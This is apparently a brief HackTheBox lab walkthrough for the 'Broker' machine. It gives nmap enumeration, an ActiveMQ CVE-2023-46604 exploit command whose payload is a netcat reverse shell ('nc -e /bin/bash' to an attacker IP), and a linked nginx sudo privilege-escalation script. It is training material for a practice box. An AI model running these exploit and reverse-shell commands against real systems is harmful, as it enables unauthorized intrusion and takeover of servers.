# HackTheBox - Broker
**Youtube video:** https://youtu.be/ZZCua-jFSXU
---
## Initial Foothold

**Enumeration:**
```bash
# Enumerate port 80
nmap -sV -sC -p 80 $IP
```

**Exploit:** ActiveMQ RCE - CVE-2023-46604
- **Payload:** https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python
```bash
# Exploit CVE-2023-46604
python exploit.py -t $IP -p [port] -c 'nc -e /bin/bash [attacker_ip] [port]'
```

---
## Priv Esc

**Exploit:** Nginx sudo privilege escalation
- **Reference:** https://github.com/strikoder/oscp-toolkit/blob/main/CVES/nginx_sudo_privesc.sh
```bash
# Check sudo permissions
sudo -l

# Run nginx privesc exploit
bash nginx_sudo_privesc.sh
```
